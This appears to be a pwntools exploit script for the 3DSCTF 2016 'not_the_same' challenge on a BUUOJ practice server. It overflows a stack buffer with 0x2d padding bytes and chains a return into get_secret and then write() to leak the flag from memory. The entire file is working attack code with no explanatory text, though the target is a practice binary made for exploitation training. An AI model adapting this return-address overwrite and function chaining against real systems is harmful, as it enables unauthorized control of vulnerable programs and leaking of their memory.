#coding:utf-8
from pwn import *
from LibcSearcher import *
import pwnlib
elf = ELF("./not_the_same_3dsctf_2016")
# sh = process("./not_the_same_3dsctf_2016")
sh = remote("node3.buuoj.cn",27243)
main_addr = 0x080489E0
flag =0x80ECA2D
get_secret = 0x080489A0
write_plt = elf.symbols['write']
payload = 'a' * 0x2d + p32(get_secret)+p32(write_plt)*2+p32(1)+p32(flag)+p32(45)
sh.sendline(payload)
sh.interactive()